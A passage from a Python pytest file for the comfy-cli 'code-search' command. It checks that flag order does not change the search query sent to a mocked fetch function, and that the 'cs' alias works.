        "argv",
        [
            pytest.param(["--repo", "ComfyUI", "--count", "1", "--json", "LoadImage"], id="flags-first"),
            pytest.param(["LoadImage", "--repo", "ComfyUI", "--count", "1", "--json"], id="flags-last"),
            pytest.param(["--repo", "ComfyUI", "LoadImage", "--count", "1", "--json"], id="interleaved"),
        ],
    )
    @patch("comfy_cli.tracking.prompt_tracking_consent")
    @patch("comfy_cli.cmdline.workspace_manager")
    @patch("comfy_cli.command.code_search._fetch_results")
    def test_flag_order_does_not_change_the_result(self, mock_fetch, mock_ws, mock_track, raw_api_response, argv, name):
        """`comfy code-search KSampler --repo X` must behave exactly like
        `comfy code-search --repo X KSampler`. Through the installed root group
        the query-first order used to fail with `Missing argument 'query'.` and
        a `COMMAND [ARGS]...` usage line, because the command was mounted as a
        Typer subgroup. Only the root group exercises that; invoking the
        module's own app directly never did."""
        from comfy_cli.cmdline import app as root_app

        mock_fetch.return_value = raw_api_response
        result = runner.invoke(root_app, [name, *argv])
        assert result.exit_code == 0, result.output
        assert "results" in json.loads(result.output)
        # Identical, not merely successful: every option must bind to the same
        # value whichever side of the query it was typed on.
        assert mock_fetch.call_args.args[0] == (r"repo:^github\.com/Comfy\-Org/ComfyUI$ type:file count:1 (LoadImage)")

    @patch("comfy_cli.tracking.prompt_tracking_consent")
    @patch("comfy_cli.cmdline.workspace_manager")
    @patch("comfy_cli.command.code_search._fetch_results")
    def test_cs_alias_registered(self, mock_fetch, mock_ws, mock_track, raw_api_response):
        from comfy_cli.cmdline import app as root_app

        mock_fetch.return_value = raw_api_response
        result = runner.invoke(root_app, ["cs", "--json", "LoadImage"])
        assert result.exit_code == 0, result.output
        parsed = json.loads(result.output)
        assert "results" in parsed
